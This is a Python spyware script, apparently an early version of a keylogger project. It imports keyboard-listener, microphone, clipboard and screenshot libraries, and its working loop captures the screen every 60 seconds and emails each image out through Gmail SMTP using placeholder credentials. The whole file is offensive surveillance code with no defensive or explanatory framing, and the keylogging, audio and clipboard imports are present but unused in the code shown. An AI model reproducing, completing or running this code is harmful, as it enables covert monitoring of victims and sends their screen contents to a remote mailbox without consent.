from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os

# Start up instances of files and paths


screenshot_information = "screenshot.png"
extend = ""

file_path =  " "#  "C:\Users\Public\Roaming"

# Time Controls
time_iteration = 15 # 7200 # 2 hours
number_of_iterations_end = 2 # 5000
microphone_time = 10 # 600 is 10 minutes


# Email Controls
email_address = "your_email_id@gmail.com"
password = "password"


#######################################################

# Send to email
def send_email(filename, attachment):
    
    fromaddr = email_address
    toaddr = email_address

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Log File"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)



while True:
    screenshot()
    send_email(screenshot_information, file_path + extend + screenshot_information)
    time.sleep(60)




